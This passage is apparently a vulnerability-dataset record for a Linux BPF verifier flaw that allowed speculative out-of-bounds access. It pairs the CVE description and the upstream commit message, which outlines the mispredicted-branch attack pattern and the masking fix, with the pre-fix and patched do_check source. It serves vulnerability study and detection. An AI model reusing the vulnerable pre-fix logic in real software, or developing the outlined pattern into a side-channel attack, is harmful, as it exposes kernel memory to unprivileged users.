        "description": "kernel/bpf/verifier.c in the Linux kernel before 4.20.6 performs undesirable out-of-bounds speculation on pointer arithmetic in various cases, including cases of different branches with different state or limits to sanitize, leading to side-channel attacks.",
        "git_url": "https://github.com/torvalds/linux/commit/979d63d50c0c0f7bc537bf821e056cc9fe5abd38",
        "commit_title": "bpf: prevent out of bounds speculation on pointer arithmetic",
        "commit_text": " Jann reported that the original commit back in b2157399cc98 (\"bpf: prevent out-of-bounds speculation\") was not sufficient to stop CPU from speculating out of bounds memory access: While b2157399cc98 only focussed on masking array map access for unprivileged users for tail calls and data access such that the user provided index gets sanitized from BPF program and syscall side, there is still a more generic form affected from BPF programs that applies to most maps that hold user data in relation to dynamic map access when dealing with unknown scalars or \"slow\" known scalars as access offset, for example:    - Load a map value pointer into R6   - Load an index into R7   - Do a slow computation (e.g. with a memory dependency) that     loads a limit into R8 (e.g. load the limit from a map for     high latency, then mask it to make the verifier happy)   - Exit if R7 >= R8 (mispredicted branch)   - Load R0 = R6[R7]   - Load R0 = R6[R0]  For unknown scalars there are two options in the BPF verifier where we could derive knowledge from in order to guarantee safe access to the memory: i) While </>/<=/>= variants won't allow to derive any lower or upper bounds from the unknown scalar where it would be safe to add it to the map value pointer, it is possible through ==/!= test however. ii) another option is to transform the unknown scalar into a known scalar, for example, through ALU ops combination such as R &= <imm> followed by R |= <imm> or any similar combination where the original information from the unknown scalar would be destroyed entirely leaving R with a constant. The initial slow load still precedes the latter ALU ops on that register, so the CPU executes speculatively from that point. Once we have the known scalar, any compare operation would work then. A third option only involving registers with known scalars could be crafted as described in [0] where a CPU port (e.g. Slow Int unit) would be filled with many dependent computations such that the subsequent condition depending on its outcome has to wait for evaluation on its execution port and thereby executing speculatively if the speculated code can be scheduled on a different execution port, or any other form of mistraining as described in [1], for example. Given this is not limited to only unknown scalars, not only map but also stack access is affected since both is accessible for unprivileged users and could potentially be used for out of bounds access under speculation.  In order to prevent any of these cases, the verifier is now sanitizing pointer arithmetic on the offset such that any out of bounds speculation would be masked in a way where the pointer arithmetic result in the destination register will stay unchanged, meaning offset masked into zero similar as in array_index_nospec() case. With regards to implementation, there are three options that were considered: i) new insn for sanitation, ii) push/pop insn and sanitation as inlined BPF, iii) reuse of ax register and sanitation as inlined BPF.  Option i) has the downside that we end up using from reserved bits in the opcode space, but also that we would require each JIT to emit masking as native arch opcodes meaning mitigation would have slow adoption till everyone implements it eventually which is counter-productive. Option ii) and iii) have both in common that a temporary register is needed in order to implement the sanitation as inlined BPF since we are not allowed to modify the source register. While a push / pop insn in ii) would be useful to have in any case, it requires once again that every JIT needs to implement it first. While possible, amount of changes needed would also be unsuitable for a -stable patch. Therefore, the path which has fewer changes, less BPF instructions for the mitigation and does not require anything to be changed in the JITs is option iii) which this work is pursuing. The ax register is already mapped to a register in all JITs (modulo arm32 where it's mapped to stack as various other BPF registers there) and used in constant blinding for JITs-only so far. It can be reused for verifier rewrites under certain constraints. The interpreter's tmp \"register\" has therefore been remapped into extending the register set with hidden ax register and reusing that for a number of instructions that needed the prior temporary variable internally (e.g. div, mod). This allows for zero increase in stack space usage in the interpreter, and enables (restricted) generic use in rewrites otherwise as long as such a patchlet does not make use of these instructions. The sanitation mask is dynamic and relative to the offset the map value or stack pointer currently holds.  There are various cases that need to be taken under consideration for the masking, e.g. such operation could look as follows: ptr += val or val += ptr or ptr -= val. Thus, the value to be sanitized could reside either in source or in destination register, and the limit is different depending on whether the ALU op is addition or subtraction and depending on the current known and bounded offset. The limit is derived as follows: limit := max_value_size - (smin_value + off). For subtraction: limit := umax_value + off. This holds because we do not allow any pointer arithmetic that would temporarily go out of bounds or would have an unknown value with mixed signed bounds where it is unclear at verification time whether the actual runtime value would be either negative or positive. For example, we have a derived map pointer value with constant offset and bounded one, so limit based on smin_value works because the verifier requires that statically analyzed arithmetic on the pointer must be in bounds, and thus it checks if resulting smin_value + off and umax_value + off is still within map value bounds at time of arithmetic in addition to time of access. Similarly, for the case of stack access we derive the limit as follows: MAX_BPF_STACK + off for subtraction and -off for the case of addition where off := ptr_reg->off + ptr_reg->var_off.value. Subtraction is a special case for the masking which can be in form of ptr += -val, ptr -= -val, or ptr -= val. In the first two cases where we know that the value is negative, we need to temporarily negate the value in order to do the sanitation on a positive value where we later swap the ALU op, and restore original source register if the value was in source.  The sanitation of pointer arithmetic alone is still not fully sufficient as is, since a scenario like the following could happen ...    PTR += 0x1000 (e.g. K-based imm)   PTR -= BIG_NUMBER_WITH_SLOW_COMPARISON   PTR += 0x1000   PTR -= BIG_NUMBER_WITH_SLOW_COMPARISON   [...]  ... which under speculation could end up as ...    PTR += 0x1000   PTR -= 0 [ truncated by mitigation ]   PTR += 0x1000   PTR -= 0 [ truncated by mitigation ]   [...]  ... and therefore still access out of bounds. To prevent such case, the verifier is also analyzing safety for potential out of bounds access under speculative execution. Meaning, it is also simulating pointer access under truncation. We therefore \"branch off\" and push the current verification state after the ALU operation with known 0 to the verification stack for later analysis. Given the current path analysis succeeded it is likely that the one under speculation can be pruned. In any case, it is also subject to existing complexity limits and therefore anything beyond this point will be rejected. In terms of pruning, it needs to be ensured that the verification state from speculative execution simulation must never prune a non-speculative execution path, therefore, we mark verifier state accordingly at the time of push_stack(). If verifier detects out of bounds access under speculative execution from one of the possible paths that includes a truncation, it will reject such program.  Given we mask every reg-based pointer arithmetic for unprivileged programs, we've been looking into how it could affect real-world programs in terms of size increase. As the majority of programs are targeted for privileged-only use case, we've unconditionally enabled masking (with its alu restrictions on top of it) for privileged programs for the sake of testing in order to check i) whether they get rejected in its current form, and ii) by how much the number of instructions and size will increase. We've tested this by using Katran, Cilium and test_l4lb from the kernel selftests. For Katran we've evaluated balancer_kern.o, Cilium bpf_lxc.o and an older test object bpf_lxc_opt_-DUNKNOWN.o and l4lb we've used test_l4lb.o as well as test_l4lb_noinline.o. We found that none of the programs got rejected by the verifier with this change, and that impact is rather minimal to none. balancer_kern.o had 13,904 bytes (1,738 insns) xlated and 7,797 bytes JITed before and after the change. Most complex program in bpf_lxc.o had 30,544 bytes (3,817 insns) xlated and 18,538 bytes JITed before and after and none of the other tail call programs in bpf_lxc.o had any changes either. For the older bpf_lxc_opt_-DUNKNOWN.o object we found a small increase from 20,616 bytes (2,576 insns) and 12,536 bytes JITed before to 20,664 bytes (2,582 insns) and 12,558 bytes JITed after the change. Other programs from that object file had similar small increase. Both test_l4lb.o had no change and remained at 6,544 bytes (817 insns) xlated and 3,401 bytes JITed and for test_l4lb_noinline.o constant at 5,080 bytes (634 insns) xlated and 3,313 bytes JITed. This can be explained in that LLVM typically optimizes stack based pointer arithmetic by using K-based operations and that use of dynamic map access is not overly frequent. However, in future we may decide to optimize the algorithm further under known guarantees from branch and value speculation. Latter seems also unclear in terms of prediction heuristics that today's CPUs apply as well as whether there could be collisions in e.g. the predictor's Value History/Pattern Table for triggering out of bounds access, thus masking is performed unconditionally at this point but could be subject to relaxation later on. We were generally also brainstorming various other approaches for mitigation, but the blocker was always lack of available registers at runtime and/or overhead for runtime tracking of limits belonging to a specific pointer. Thus, we found this to be minimally intrusive under given constraints.  With that in place, a simple example with sanitized access on unprivileged load at post-verification time looks as follows:    # bpftool prog dump xlated id 282   [...]   28: (79) r1 = *(u64 *)(r7 +0)   29: (79) r2 = *(u64 *)(r7 +8)   30: (57) r1 &= 15   31: (79) r3 = *(u64 *)(r0 +4608)   32: (57) r3 &= 1   33: (47) r3 |= 1   34: (2d) if r2 > r3 goto pc+19   35: (b4) (u32) r11 = (u32) 20479  |   36: (1f) r11 -= r2                | Dynamic sanitation for pointer   37: (4f) r11 |= r2                | arithmetic with registers   38: (87) r11 = -r11               | containing bounded or known   39: (c7) r11 s>>= 63              | scalars in order to prevent   40: (5f) r11 &= r2                | out of bounds speculation.   41: (0f) r4 += r11                |   42: (71) r4 = *(u8 *)(r4 +0)   43: (6f) r4 <<= r1   [...]  For the case where the scalar sits in the destination register as opposed to the source register, the following code is emitted for the above example:    [...]   16: (b4) (u32) r11 = (u32) 20479   17: (1f) r11 -= r2   18: (4f) r11 |= r2   19: (87) r11 = -r11   20: (c7) r11 s>>= 63   21: (5f) r2 &= r11   22: (0f) r2 += r0   23: (61) r0 = *(u32 *)(r2 +0)   [...]  JIT blinding example with non-conflicting use of r10:    [...]    d5:\tje     0x0000000000000106    _    d7:\tmov    0x0(%rax),%edi       |    da:\tmov    $0xf153246,%r10d     | Index load from map value and    e0:\txor    $0xf153259,%r10      | (const blinded) mask with 0x1f.    e7:\tand    %r10,%rdi            |_    ea:\tmov    $0x2f,%r10d          |    f0:\tsub    %rdi,%r10            | Sanitized addition. Both use r10    f3:\tor     %rdi,%r10            | but do not interfere with each    f6:\tneg    %r10                 | other. (Neither do these instructions    f9:\tsar    $0x3f,%r10           | interfere with the use of ax as temp    fd:\tand    %r10,%rdi            | in interpreter.)   100:\tadd    %rax,%rdi            |_   103:\tmov    0x0(%rdi),%eax  [...]  Tested that it fixes Jann's reproducer, and also checked that test_verifier and test_progs suite with interpreter, JIT and JIT with hardening enabled on x86-64 and arm64 runs successfully.    [0] Speculose: Analyzing the Security Implications of Speculative       Execution in CPUs, Giorgi Maisuradze and Christian Rossow,       https://arxiv.org/pdf/1801.04084.pdf    [1] A Systematic Evaluation of Transient Execution Attacks and       Defenses, Claudio Canella, Jo Van Bulck, Michael Schwarz,       Moritz Lipp, Benjamin von Berg, Philipp Ortner, Frank Piessens,       Dmitry Evtyushkin, Daniel Gruss,       https://arxiv.org/pdf/1811.05441.pdf ",
        "func_before": "static int do_check(struct bpf_verifier_env *env)\n{\n\tstruct bpf_verifier_state *state;\n\tstruct bpf_insn *insns = env->prog->insnsi;\n\tstruct bpf_reg_state *regs;\n\tint insn_cnt = env->prog->len, i;\n\tint insn_processed = 0;\n\tbool do_print_state = false;\n\n\tenv->prev_linfo = NULL;\n\n\tstate = kzalloc(sizeof(struct bpf_verifier_state), GFP_KERNEL);\n\tif (!state)\n\t\treturn -ENOMEM;\n\tstate->curframe = 0;\n\tstate->frame[0] = kzalloc(sizeof(struct bpf_func_state), GFP_KERNEL);\n\tif (!state->frame[0]) {\n\t\tkfree(state);\n\t\treturn -ENOMEM;\n\t}\n\tenv->cur_state = state;\n\tinit_func_state(env, state->frame[0],\n\t\t\tBPF_MAIN_FUNC /* callsite */,\n\t\t\t0 /* frameno */,\n\t\t\t0 /* subprogno, zero == main subprog */);\n\n\tfor (;;) {\n\t\tstruct bpf_insn *insn;\n\t\tu8 class;\n\t\tint err;\n\n\t\tif (env->insn_idx >= insn_cnt) {\n\t\t\tverbose(env, \"invalid insn idx %d insn_cnt %d\\n\",\n\t\t\t\tenv->insn_idx, insn_cnt);\n\t\t\treturn -EFAULT;\n\t\t}\n\n\t\tinsn = &insns[env->insn_idx];\n\t\tclass = BPF_CLASS(insn->code);\n\n\t\tif (++insn_processed > BPF_COMPLEXITY_LIMIT_INSNS) {\n\t\t\tverbose(env,\n\t\t\t\t\"BPF program is too large. Processed %d insn\\n\",\n\t\t\t\tinsn_processed);\n\t\t\treturn -E2BIG;\n\t\t}\n\n\t\terr = is_state_visited(env, env->insn_idx);\n\t\tif (err < 0)\n\t\t\treturn err;\n\t\tif (err == 1) {\n\t\t\t/* found equivalent state, can prune the search */\n\t\t\tif (env->log.level) {\n\t\t\t\tif (do_print_state)\n\t\t\t\t\tverbose(env, \"\\nfrom %d to %d: safe\\n\",\n\t\t\t\t\t\tenv->prev_insn_idx, env->insn_idx);\n\t\t\t\telse\n\t\t\t\t\tverbose(env, \"%d: safe\\n\", env->insn_idx);\n\t\t\t}\n\t\t\tgoto process_bpf_exit;\n\t\t}\n\n\t\tif (signal_pending(current))\n\t\t\treturn -EAGAIN;\n\n\t\tif (need_resched())\n\t\t\tcond_resched();\n\n\t\tif (env->log.level > 1 || (env->log.level && do_print_state)) {\n\t\t\tif (env->log.level > 1)\n\t\t\t\tverbose(env, \"%d:\", env->insn_idx);\n\t\t\telse\n\t\t\t\tverbose(env, \"\\nfrom %d to %d:\",\n\t\t\t\t\tenv->prev_insn_idx, env->insn_idx);\n\t\t\tprint_verifier_state(env, state->frame[state->curframe]);\n\t\t\tdo_print_state = false;\n\t\t}\n\n\t\tif (env->log.level) {\n\t\t\tconst struct bpf_insn_cbs cbs = {\n\t\t\t\t.cb_print\t= verbose,\n\t\t\t\t.private_data\t= env,\n\t\t\t};\n\n\t\t\tverbose_linfo(env, env->insn_idx, \"; \");\n\t\t\tverbose(env, \"%d: \", env->insn_idx);\n\t\t\tprint_bpf_insn(&cbs, insn, env->allow_ptr_leaks);\n\t\t}\n\n\t\tif (bpf_prog_is_dev_bound(env->prog->aux)) {\n\t\t\terr = bpf_prog_offload_verify_insn(env, env->insn_idx,\n\t\t\t\t\t\t\t   env->prev_insn_idx);\n\t\t\tif (err)\n\t\t\t\treturn err;\n\t\t}\n\n\t\tregs = cur_regs(env);\n\t\tenv->insn_aux_data[env->insn_idx].seen = true;\n\n\t\tif (class == BPF_ALU || class == BPF_ALU64) {\n\t\t\terr = check_alu_op(env, insn);\n\t\t\tif (err)\n\t\t\t\treturn err;\n\n\t\t} else if (class == BPF_LDX) {\n\t\t\tenum bpf_reg_type *prev_src_type, src_reg_type;\n\n\t\t\t/* check for reserved fields is already done */\n\n\t\t\t/* check src operand */\n\t\t\terr = check_reg_arg(env, insn->src_reg, SRC_OP);\n\t\t\tif (err)\n\t\t\t\treturn err;\n\n\t\t\terr = check_reg_arg(env, insn->dst_reg, DST_OP_NO_MARK);\n\t\t\tif (err)\n\t\t\t\treturn err;\n\n\t\t\tsrc_reg_type = regs[insn->src_reg].type;\n\n\t\t\t/* check that memory (src_reg + off) is readable,\n\t\t\t * the state of dst_reg will be updated by this func\n\t\t\t */\n\t\t\terr = check_mem_access(env, env->insn_idx, insn->src_reg,\n\t\t\t\t\t       insn->off, BPF_SIZE(insn->code),\n\t\t\t\t\t       BPF_READ, insn->dst_reg, false);\n\t\t\tif (err)\n\t\t\t\treturn err;\n\n\t\t\tprev_src_type = &env->insn_aux_data[env->insn_idx].ptr_type;\n\n\t\t\tif (*prev_src_type == NOT_INIT) {\n\t\t\t\t/* saw a valid insn\n\t\t\t\t * dst_reg = *(u32 *)(src_reg + off)\n\t\t\t\t * save type to validate intersecting paths\n\t\t\t\t */\n\t\t\t\t*prev_src_type = src_reg_type;\n\n\t\t\t} else if (reg_type_mismatch(src_reg_type, *prev_src_type)) {\n\t\t\t\t/* ABuser program is trying to use the same insn\n\t\t\t\t * dst_reg = *(u32*) (src_reg + off)\n\t\t\t\t * with different pointer types:\n\t\t\t\t * src_reg == ctx in one branch and\n\t\t\t\t * src_reg == stack|map in some other branch.\n\t\t\t\t * Reject it.\n\t\t\t\t */\n\t\t\t\tverbose(env, \"same insn cannot be used with different pointers\\n\");\n\t\t\t\treturn -EINVAL;\n\t\t\t}\n\n\t\t} else if (class == BPF_STX) {\n\t\t\tenum bpf_reg_type *prev_dst_type, dst_reg_type;\n\n\t\t\tif (BPF_MODE(insn->code) == BPF_XADD) {\n\t\t\t\terr = check_xadd(env, env->insn_idx, insn);\n\t\t\t\tif (err)\n\t\t\t\t\treturn err;\n\t\t\t\tenv->insn_idx++;\n\t\t\t\tcontinue;\n\t\t\t}\n\n\t\t\t/* check src1 operand */\n\t\t\terr = check_reg_arg(env, insn->src_reg, SRC_OP);\n\t\t\tif (err)\n\t\t\t\treturn err;\n\t\t\t/* check src2 operand */\n\t\t\terr = check_reg_arg(env, insn->dst_reg, SRC_OP);\n\t\t\tif (err)\n\t\t\t\treturn err;\n\n\t\t\tdst_reg_type = regs[insn->dst_reg].type;\n\n\t\t\t/* check that memory (dst_reg + off) is writeable */\n\t\t\terr = check_mem_access(env, env->insn_idx, insn->dst_reg,\n\t\t\t\t\t       insn->off, BPF_SIZE(insn->code),\n\t\t\t\t\t       BPF_WRITE, insn->src_reg, false);\n\t\t\tif (err)\n\t\t\t\treturn err;\n\n\t\t\tprev_dst_type = &env->insn_aux_data[env->insn_idx].ptr_type;\n\n\t\t\tif (*prev_dst_type == NOT_INIT) {\n\t\t\t\t*prev_dst_type = dst_reg_type;\n\t\t\t} else if (reg_type_mismatch(dst_reg_type, *prev_dst_type)) {\n\t\t\t\tverbose(env, \"same insn cannot be used with different pointers\\n\");\n\t\t\t\treturn -EINVAL;\n\t\t\t}\n\n\t\t} else if (class == BPF_ST) {\n\t\t\tif (BPF_MODE(insn->code) != BPF_MEM ||\n\t\t\t    insn->src_reg != BPF_REG_0) {\n\t\t\t\tverbose(env, \"BPF_ST uses reserved fields\\n\");\n\t\t\t\treturn -EINVAL;\n\t\t\t}\n\t\t\t/* check src operand */\n\t\t\terr = check_reg_arg(env, insn->dst_reg, SRC_OP);\n\t\t\tif (err)\n\t\t\t\treturn err;\n\n\t\t\tif (is_ctx_reg(env, insn->dst_reg)) {\n\t\t\t\tverbose(env, \"BPF_ST stores into R%d %s is not allowed\\n\",\n\t\t\t\t\tinsn->dst_reg,\n\t\t\t\t\treg_type_str[reg_state(env, insn->dst_reg)->type]);\n\t\t\t\treturn -EACCES;\n\t\t\t}\n\n\t\t\t/* check that memory (dst_reg + off) is writeable */\n\t\t\terr = check_mem_access(env, env->insn_idx, insn->dst_reg,\n\t\t\t\t\t       insn->off, BPF_SIZE(insn->code),\n\t\t\t\t\t       BPF_WRITE, -1, false);\n\t\t\tif (err)\n\t\t\t\treturn err;\n\n\t\t} else if (class == BPF_JMP) {\n\t\t\tu8 opcode = BPF_OP(insn->code);\n\n\t\t\tif (opcode == BPF_CALL) {\n\t\t\t\tif (BPF_SRC(insn->code) != BPF_K ||\n\t\t\t\t    insn->off != 0 ||\n\t\t\t\t    (insn->src_reg != BPF_REG_0 &&\n\t\t\t\t     insn->src_reg != BPF_PSEUDO_CALL) ||\n\t\t\t\t    insn->dst_reg != BPF_REG_0) {\n\t\t\t\t\tverbose(env, \"BPF_CALL uses reserved fields\\n\");\n\t\t\t\t\treturn -EINVAL;\n\t\t\t\t}\n\n\t\t\t\tif (insn->src_reg == BPF_PSEUDO_CALL)\n\t\t\t\t\terr = check_func_call(env, insn, &env->insn_idx);\n\t\t\t\telse\n\t\t\t\t\terr = check_helper_call(env, insn->imm, env->insn_idx);\n\t\t\t\tif (err)\n\t\t\t\t\treturn err;\n\n\t\t\t} else if (opcode == BPF_JA) {\n\t\t\t\tif (BPF_SRC(insn->code) != BPF_K ||\n\t\t\t\t    insn->imm != 0 ||\n\t\t\t\t    insn->src_reg != BPF_REG_0 ||\n\t\t\t\t    insn->dst_reg != BPF_REG_0) {\n\t\t\t\t\tverbose(env, \"BPF_JA uses reserved fields\\n\");\n\t\t\t\t\treturn -EINVAL;\n\t\t\t\t}\n\n\t\t\t\tenv->insn_idx += insn->off + 1;\n\t\t\t\tcontinue;\n\n\t\t\t} else if (opcode == BPF_EXIT) {\n\t\t\t\tif (BPF_SRC(insn->code) != BPF_K ||\n\t\t\t\t    insn->imm != 0 ||\n\t\t\t\t    insn->src_reg != BPF_REG_0 ||\n\t\t\t\t    insn->dst_reg != BPF_REG_0) {\n\t\t\t\t\tverbose(env, \"BPF_EXIT uses reserved fields\\n\");\n\t\t\t\t\treturn -EINVAL;\n\t\t\t\t}\n\n\t\t\t\tif (state->curframe) {\n\t\t\t\t\t/* exit from nested function */\n\t\t\t\t\tenv->prev_insn_idx = env->insn_idx;\n\t\t\t\t\terr = prepare_func_exit(env, &env->insn_idx);\n\t\t\t\t\tif (err)\n\t\t\t\t\t\treturn err;\n\t\t\t\t\tdo_print_state = true;\n\t\t\t\t\tcontinue;\n\t\t\t\t}\n\n\t\t\t\terr = check_reference_leak(env);\n\t\t\t\tif (err)\n\t\t\t\t\treturn err;\n\n\t\t\t\t/* eBPF calling convetion is such that R0 is used\n\t\t\t\t * to return the value from eBPF program.\n\t\t\t\t * Make sure that it's readable at this time\n\t\t\t\t * of bpf_exit, which means that program wrote\n\t\t\t\t * something into it earlier\n\t\t\t\t */\n\t\t\t\terr = check_reg_arg(env, BPF_REG_0, SRC_OP);\n\t\t\t\tif (err)\n\t\t\t\t\treturn err;\n\n\t\t\t\tif (is_pointer_value(env, BPF_REG_0)) {\n\t\t\t\t\tverbose(env, \"R0 leaks addr as return value\\n\");\n\t\t\t\t\treturn -EACCES;\n\t\t\t\t}\n\n\t\t\t\terr = check_return_code(env);\n\t\t\t\tif (err)\n\t\t\t\t\treturn err;\nprocess_bpf_exit:\n\t\t\t\terr = pop_stack(env, &env->prev_insn_idx,\n\t\t\t\t\t\t&env->insn_idx);\n\t\t\t\tif (err < 0) {\n\t\t\t\t\tif (err != -ENOENT)\n\t\t\t\t\t\treturn err;\n\t\t\t\t\tbreak;\n\t\t\t\t} else {\n\t\t\t\t\tdo_print_state = true;\n\t\t\t\t\tcontinue;\n\t\t\t\t}\n\t\t\t} else {\n\t\t\t\terr = check_cond_jmp_op(env, insn, &env->insn_idx);\n\t\t\t\tif (err)\n\t\t\t\t\treturn err;\n\t\t\t}\n\t\t} else if (class == BPF_LD) {\n\t\t\tu8 mode = BPF_MODE(insn->code);\n\n\t\t\tif (mode == BPF_ABS || mode == BPF_IND) {\n\t\t\t\terr = check_ld_abs(env, insn);\n\t\t\t\tif (err)\n\t\t\t\t\treturn err;\n\n\t\t\t} else if (mode == BPF_IMM) {\n\t\t\t\terr = check_ld_imm(env, insn);\n\t\t\t\tif (err)\n\t\t\t\t\treturn err;\n\n\t\t\t\tenv->insn_idx++;\n\t\t\t\tenv->insn_aux_data[env->insn_idx].seen = true;\n\t\t\t} else {\n\t\t\t\tverbose(env, \"invalid BPF_LD mode\\n\");\n\t\t\t\treturn -EINVAL;\n\t\t\t}\n\t\t} else {\n\t\t\tverbose(env, \"unknown insn class %d\\n\", class);\n\t\t\treturn -EINVAL;\n\t\t}\n\n\t\tenv->insn_idx++;\n\t}\n\n\tverbose(env, \"processed %d insns (limit %d), stack depth \",\n\t\tinsn_processed, BPF_COMPLEXITY_LIMIT_INSNS);\n\tfor (i = 0; i < env->subprog_cnt; i++) {\n\t\tu32 depth = env->subprog_info[i].stack_depth;\n\n\t\tverbose(env, \"%d\", depth);\n\t\tif (i + 1 < env->subprog_cnt)\n\t\t\tverbose(env, \"+\");\n\t}\n\tverbose(env, \"\\n\");\n\tenv->prog->aux->stack_depth = env->subprog_info[0].stack_depth;\n\treturn 0;\n}",
        "func": "static int do_check(struct bpf_verifier_env *env)\n{\n\tstruct bpf_verifier_state *state;\n\tstruct bpf_insn *insns = env->prog->insnsi;\n\tstruct bpf_reg_state *regs;\n\tint insn_cnt = env->prog->len, i;\n\tint insn_processed = 0;\n\tbool do_print_state = false;\n\n\tenv->prev_linfo = NULL;\n\n\tstate = kzalloc(sizeof(struct bpf_verifier_state), GFP_KERNEL);\n\tif (!state)\n\t\treturn -ENOMEM;\n\tstate->curframe = 0;\n\tstate->speculative = false;\n\tstate->frame[0] = kzalloc(sizeof(struct bpf_func_state), GFP_KERNEL);\n\tif (!state->frame[0]) {\n\t\tkfree(state);\n\t\treturn -ENOMEM;\n\t}\n\tenv->cur_state = state;\n\tinit_func_state(env, state->frame[0],\n\t\t\tBPF_MAIN_FUNC /* callsite */,\n\t\t\t0 /* frameno */,\n\t\t\t0 /* subprogno, zero == main subprog */);\n\n\tfor (;;) {\n\t\tstruct bpf_insn *insn;\n\t\tu8 class;\n\t\tint err;\n\n\t\tif (env->insn_idx >= insn_cnt) {\n\t\t\tverbose(env, \"invalid insn idx %d insn_cnt %d\\n\",\n\t\t\t\tenv->insn_idx, insn_cnt);\n\t\t\treturn -EFAULT;\n\t\t}\n\n\t\tinsn = &insns[env->insn_idx];\n\t\tclass = BPF_CLASS(insn->code);\n\n\t\tif (++insn_processed > BPF_COMPLEXITY_LIMIT_INSNS) {\n\t\t\tverbose(env,\n\t\t\t\t\"BPF program is too large. Processed %d insn\\n\",\n\t\t\t\tinsn_processed);\n\t\t\treturn -E2BIG;\n\t\t}\n\n\t\terr = is_state_visited(env, env->insn_idx);\n\t\tif (err < 0)\n\t\t\treturn err;\n\t\tif (err == 1) {\n\t\t\t/* found equivalent state, can prune the search */\n\t\t\tif (env->log.level) {\n\t\t\t\tif (do_print_state)\n\t\t\t\t\tverbose(env, \"\\nfrom %d to %d%s: safe\\n\",\n\t\t\t\t\t\tenv->prev_insn_idx, env->insn_idx,\n\t\t\t\t\t\tenv->cur_state->speculative ?\n\t\t\t\t\t\t\" (speculative execution)\" : \"\");\n\t\t\t\telse\n\t\t\t\t\tverbose(env, \"%d: safe\\n\", env->insn_idx);\n\t\t\t}\n\t\t\tgoto process_bpf_exit;\n\t\t}\n\n\t\tif (signal_pending(current))\n\t\t\treturn -EAGAIN;\n\n\t\tif (need_resched())\n\t\t\tcond_resched();\n\n\t\tif (env->log.level > 1 || (env->log.level && do_print_state)) {\n\t\t\tif (env->log.level > 1)\n\t\t\t\tverbose(env, \"%d:\", env->insn_idx);\n\t\t\telse\n\t\t\t\tverbose(env, \"\\nfrom %d to %d%s:\",\n\t\t\t\t\tenv->prev_insn_idx, env->insn_idx,\n\t\t\t\t\tenv->cur_state->speculative ?\n\t\t\t\t\t\" (speculative execution)\" : \"\");\n\t\t\tprint_verifier_state(env, state->frame[state->curframe]);\n\t\t\tdo_print_state = false;\n\t\t}\n\n\t\tif (env->log.level) {\n\t\t\tconst struct bpf_insn_cbs cbs = {\n\t\t\t\t.cb_print\t= verbose,\n\t\t\t\t.private_data\t= env,\n\t\t\t};\n\n\t\t\tverbose_linfo(env, env->insn_idx, \"; \");\n\t\t\tverbose(env, \"%d: \", env->insn_idx);\n\t\t\tprint_bpf_insn(&cbs, insn, env->allow_ptr_leaks);\n\t\t}\n\n\t\tif (bpf_prog_is_dev_bound(env->prog->aux)) {\n\t\t\terr = bpf_prog_offload_verify_insn(env, env->insn_idx,\n\t\t\t\t\t\t\t   env->prev_insn_idx);\n\t\t\tif (err)\n\t\t\t\treturn err;\n\t\t}\n\n\t\tregs = cur_regs(env);\n\t\tenv->insn_aux_data[env->insn_idx].seen = true;\n\n\t\tif (class == BPF_ALU || class == BPF_ALU64) {\n\t\t\terr = check_alu_op(env, insn);\n\t\t\tif (err)\n\t\t\t\treturn err;\n\n\t\t} else if (class == BPF_LDX) {\n\t\t\tenum bpf_reg_type *prev_src_type, src_reg_type;\n\n\t\t\t/* check for reserved fields is already done */\n\n\t\t\t/* check src operand */\n\t\t\terr = check_reg_arg(env, insn->src_reg, SRC_OP);\n\t\t\tif (err)\n\t\t\t\treturn err;\n\n\t\t\terr = check_reg_arg(env, insn->dst_reg, DST_OP_NO_MARK);\n\t\t\tif (err)\n\t\t\t\treturn err;\n\n\t\t\tsrc_reg_type = regs[insn->src_reg].type;\n\n\t\t\t/* check that memory (src_reg + off) is readable,\n\t\t\t * the state of dst_reg will be updated by this func\n\t\t\t */\n\t\t\terr = check_mem_access(env, env->insn_idx, insn->src_reg,\n\t\t\t\t\t       insn->off, BPF_SIZE(insn->code),\n\t\t\t\t\t       BPF_READ, insn->dst_reg, false);\n\t\t\tif (err)\n\t\t\t\treturn err;\n\n\t\t\tprev_src_type = &env->insn_aux_data[env->insn_idx].ptr_type;\n\n\t\t\tif (*prev_src_type == NOT_INIT) {\n\t\t\t\t/* saw a valid insn\n\t\t\t\t * dst_reg = *(u32 *)(src_reg + off)\n\t\t\t\t * save type to validate intersecting paths\n\t\t\t\t */\n\t\t\t\t*prev_src_type = src_reg_type;\n\n\t\t\t} else if (reg_type_mismatch(src_reg_type, *prev_src_type)) {\n\t\t\t\t/* ABuser program is trying to use the same insn\n\t\t\t\t * dst_reg = *(u32*) (src_reg + off)\n\t\t\t\t * with different pointer types:\n\t\t\t\t * src_reg == ctx in one branch and\n\t\t\t\t * src_reg == stack|map in some other branch.\n\t\t\t\t * Reject it.\n\t\t\t\t */\n\t\t\t\tverbose(env, \"same insn cannot be used with different pointers\\n\");\n\t\t\t\treturn -EINVAL;\n\t\t\t}\n\n\t\t} else if (class == BPF_STX) {\n\t\t\tenum bpf_reg_type *prev_dst_type, dst_reg_type;\n\n\t\t\tif (BPF_MODE(insn->code) == BPF_XADD) {\n\t\t\t\terr = check_xadd(env, env->insn_idx, insn);\n\t\t\t\tif (err)\n\t\t\t\t\treturn err;\n\t\t\t\tenv->insn_idx++;\n\t\t\t\tcontinue;\n\t\t\t}\n\n\t\t\t/* check src1 operand */\n\t\t\terr = check_reg_arg(env, insn->src_reg, SRC_OP);\n\t\t\tif (err)\n\t\t\t\treturn err;\n\t\t\t/* check src2 operand */\n\t\t\terr = check_reg_arg(env, insn->dst_reg, SRC_OP);\n\t\t\tif (err)\n\t\t\t\treturn err;\n\n\t\t\tdst_reg_type = regs[insn->dst_reg].type;\n\n\t\t\t/* check that memory (dst_reg + off) is writeable */\n\t\t\terr = check_mem_access(env, env->insn_idx, insn->dst_reg,\n\t\t\t\t\t       insn->off, BPF_SIZE(insn->code),\n\t\t\t\t\t       BPF_WRITE, insn->src_reg, false);\n\t\t\tif (err)\n\t\t\t\treturn err;\n\n\t\t\tprev_dst_type = &env->insn_aux_data[env->insn_idx].ptr_type;\n\n\t\t\tif (*prev_dst_type == NOT_INIT) {\n\t\t\t\t*prev_dst_type = dst_reg_type;\n\t\t\t} else if (reg_type_mismatch(dst_reg_type, *prev_dst_type)) {\n\t\t\t\tverbose(env, \"same insn cannot be used with different pointers\\n\");\n\t\t\t\treturn -EINVAL;\n\t\t\t}\n\n\t\t} else if (class == BPF_ST) {\n\t\t\tif (BPF_MODE(insn->code) != BPF_MEM ||\n\t\t\t    insn->src_reg != BPF_REG_0) {\n\t\t\t\tverbose(env, \"BPF_ST uses reserved fields\\n\");\n\t\t\t\treturn -EINVAL;\n\t\t\t}\n\t\t\t/* check src operand 